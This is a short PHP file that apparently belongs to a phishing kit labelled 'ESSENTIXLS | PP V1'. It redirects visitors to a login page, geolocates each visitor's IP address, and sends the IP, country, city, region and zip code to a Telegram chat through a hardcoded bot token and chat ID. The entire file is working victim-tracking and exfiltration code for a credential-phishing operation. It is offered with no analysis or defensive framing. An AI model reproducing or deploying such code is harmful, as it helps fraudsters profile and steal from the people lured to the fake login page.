<?php
header("Location: login.php");
?>
<?php 
$ip = getenv("REMOTE_ADDR");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$msg="ESSENTIXLS | PP V1\n".$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."";

file_get_contents("https://api.telegram.org/bot5012083521:AAEqlGPhImsNdzyFzTG_y7_AsjmPDwTRqNs/sendMessage?chat_id=1422019326&text=" . urlencode($msg)."" );
?>
